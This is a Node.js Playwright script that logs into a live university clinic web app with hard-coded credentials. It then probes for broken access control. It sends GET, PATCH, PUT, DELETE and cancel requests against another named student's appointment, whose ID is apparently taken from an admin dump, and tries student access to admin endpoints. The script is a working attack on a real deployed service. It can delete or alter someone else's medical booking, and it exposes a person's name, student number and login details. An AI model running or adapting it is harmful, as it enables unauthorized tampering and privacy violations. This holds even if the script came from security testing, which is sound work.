const { chromium } = require('playwright');
const BASE = 'https://uksw-clinic.onrender.com';
const N = (m) => console.log(m);
const api = (page, m, p, b) => page.evaluate(async ([m,p,b]) => {
  try { const r = await fetch(p,{method:m,headers:b?{'content-type':'application/json'}:{},body:b?JSON.stringify(b):undefined}); return {s:r.status,b:(await r.text()).slice(0,400)}; }
  catch(e){return {s:'ERR',b:String(e)};}
}, [m,p,b]);

// real appointment UUID belonging to ANOTHER student (Bagas, nim 672022045), from admin dump
const OTHER = 'ea0bc21e-4f58-4763-9ae2-ee64476f70ea';

(async () => {
  const browser = await chromium.launch({ headless: true });
  const sCtx = await browser.newContext(); const s = await sCtx.newPage();
  await s.goto(BASE); await s.fill('#f-user','676767676'); await s.fill('#f-pass','12345678');
  await s.click('button[type=submit]'); await s.waitForTimeout(3000);
  N('me role check -> ' + (await api(s,'GET','/api/me')).b.slice(0,60));

  // object-level access to another student's appointment
  for (const m of ['GET','PATCH','PUT','DELETE']) {
    const body = (m==='GET'||m==='DELETE') ? null : {status:'Cancelled',time:'23:00'};
    N(`STUDENT ${m} /api/appointments/${OTHER} -> ` + JSON.stringify(await api(s,m,'/api/appointments/'+OTHER, body)));
  }
  // cancel route variants
  N('STUDENT POST cancel -> ' + JSON.stringify(await api(s,'POST','/api/appointments/'+OTHER+'/cancel')));

  // privilege escalation: can student POST to admin endpoints
  N('STUDENT POST /api/admin/stats -> ' + JSON.stringify(await api(s,'POST','/api/admin/stats',{})));
  N('STUDENT PATCH other via admin -> ' + JSON.stringify(await api(s,'PATCH','/api/appointments/'+OTHER,{status:'Confirmed'})));

  await browser.close();
})();
